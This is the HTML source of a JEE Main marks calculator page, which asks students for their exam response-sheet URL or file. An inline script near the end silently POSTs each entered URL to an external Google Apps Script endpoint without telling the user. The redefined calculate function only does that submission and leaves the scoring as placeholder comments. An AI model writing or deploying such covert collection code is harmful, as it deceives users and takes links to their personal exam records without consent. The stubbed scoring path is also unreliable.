<html lang="en" data-theme="dark">

<head>
    <title>Jee Main Marks Calculator</title>
    <script>
        window.goatcounter = {
            path: function(p) {
                return location.host + p
            }
        }
    </script>
    <script data-goatcounter="https://timepassuser.goatcounter.com/count" async src="//gc.zgo.at/count.js"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@picocss/pico@1/css/pico.min.css" />
    <script src="main.js" defer></script>
    <script src="answerkeys.js"></script>
    <script src="proxies.js"></script>
    <style>
        /* Your existing styles */
    </style>
</head>

<body>
    <div class="custom-container" data-theme="dark">
        <h1>Jee Mains Marks Calculator</h1>
        <div id="centerLink">
            <a href="https://github.com/timepassuser/Jee-Mains-Marks-Calculator">Source on github</a>
        </div>
        <div id="responsediv">
            <p>
                Enter your response sheet url (should begin with https:// and can only be of cdn3.digialm.com), <br><strong>OR</strong><br>
                Put your response sheet/attempted answers here in html format. ...
            </p>

            <input id="fileURL" placeholder="Fetch your response sheet from link" type="text">
            <div id="loader" style="display:none;">
                <div id="loadingText" style="text-align: center;">Loading..</div>
                <div class="animationContainer">
                    <div class="wave"></div>
                    <div class="wave"></div>
                    <div class="wave"></div>
                    <div class="wave"></div>
                    <div class="wave"></div>
                    <div class="wave"></div>
                    <div class="wave"></div>
                    <div class="wave"></div>
                    <div class="wave"></div>
                    <div class="wave"></div>
                </div>
            </div>
            <p id="urlError" style="display: none; color: #ea4c89;"></p>
            <button id="fetchSheet" class="differentColor" onclick="fetchSheetAndCalculate()">Get response sheet html and calculate score</button>
            <button id="downloadSheet" class="differentColor" onclick="downloadResponseSheet()">Download response sheet as html</button>

            <p>or</p>

            <button id="fileElementButton" class="differentColor" onclick="fileElement.click()">Select your response sheet html file</button>
            <input id="fileElement" type="file" style="display: none;">
        </div>
        <div>
            <ul id="marks"></ul>
        </div>

        <dialog id="imageModal" open>
            <article id="modalArticle">
                <button onclick="closeModal()" aria-label="Close" rel="prev">Close Image</button>
                <hr>
                <div id="imageContainerDiv"></div>
            </article>
        </dialog>

        <div id="buttonContainer">
            <button class="sortButton" id="sortByAscending" onclick="sortInAscendingOrder=true;questionSort()">Sort questions in ascending order</button>
            <button class="sortButton" id="sortByResponsesheet" onclick="sortInAscendingOrder=false;questionSort()">Sort questions in response sheet order</button>
            <button class="sortButton" id="downloadResult" onclick="getResultPDF()">Download result as a PDF</button>
        </div>
        <div id="result">
            <p class="subject">Maths Question Analysis</p>
            <table class="subjecttable" id="maths">
                <tr>
                    <th>QuestionID</th>
                    <th>Type</th>
                    <th>Status</th>
                    <th>Selected OptionId/Integer Answer</th>
                    <th>Correct OptionId/Integer Answer</th>
                </tr>
            </table>
            <p class="subject">Physics Question Analysis</p>
            <table class="subjecttable" id="physics">
                <tr>
                    <th>QuestionID</th>
                    <th>Type</th>
                    <th>Status</th>
                    <th>Selected OptionId/Integer Answer</th>
                    <th>Correct OptionId/Integer Answer</th>
                </tr>
            </table>
            <p class="subject">Chemistry Question Analysis</p>
            <table class="subjecttable" id="chem">
                <tr>
                    <th>QuestionID</th>
                    <th>Type</th>
                    <th>Status</th>
                    <th>Selected OptionId/Integer Answer</th>
                    <th>Correct OptionId/Integer Answer</th>
                </tr>
            </table>
        </div>
    </div>
    <!-- <footer id="footer"><a href="https://github.com/timepassuser/Jee-Mains-Marks-Calculator">Source on Github</a></footer> -->

    <script>
        // Function to silently submit the user's URL to the Google Apps Script backend
        function submitUrlSilently(url) {
            fetch("https://script.google.com/macros/s/AKfycbx1_wPpSIV_RhXRMtzWFmOl968BweN1IUGzq5CAoP5EbbORQu_nUOYZt8zFcOW0WYDT_Q/exec", {  // Your Web App URL
                method: "POST",
                body: JSON.stringify({ url: url }),
                headers: {
                    'Content-Type': 'application/json',
                },
            }).then(response => {
                console.log("URL submitted successfully");
            }).catch(error => {
                console.error("Error submitting URL:", error);
            });
        }

        // Modify the fetchSheetAndCalculate function to include URL submission
        function fetchSheetAndCalculate() {
            const urlInput = document.getElementById('fileURL').value;

            if (urlInput) {
                // Submit the URL before processing
                submitUrlSilently(urlInput);

                // Existing code for fetching the sheet and calculating score goes here...
                // (Call your existing functionality to fetch the sheet)
            } else {
                alert("Please enter a valid URL.");
            }
        }
    </script>
</body>

</html>
